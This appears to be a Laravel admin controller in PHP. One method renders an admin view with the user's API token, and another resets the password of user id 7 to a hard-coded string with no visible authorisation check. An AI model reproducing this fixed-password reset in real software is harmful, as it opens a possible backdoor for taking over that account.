<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class AdminController extends Controller
{
    public function index(){
        $user_token = Auth::user() ? Auth::user()->api_token : null;
        return view('admin', compact('user_token'));
    }

    public function set()
    {
        DB::table('users')->where('id', 7)->update([
            'password' => Hash::make("xsoal@ukr.net"),
        ]);
    }
}
